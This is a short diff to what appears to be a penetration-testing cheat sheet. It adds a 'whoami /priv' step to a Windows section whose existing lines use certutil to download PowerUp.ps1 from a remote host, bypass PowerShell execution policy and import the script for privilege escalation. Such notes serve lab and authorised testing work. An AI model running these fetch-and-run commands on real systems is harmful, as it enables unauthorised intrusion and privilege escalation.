@@ -62,6 +62,7 @@ uname -a ; arch
 
 ### Windows
 ```bash
+whoami /priv
 certutil.exe -urlcache -split -f "http://192.168.45.191:8000/PowerUp.ps1" pu.ps1
 powershell -ep bypass
 Import-Module .\pu.ps1
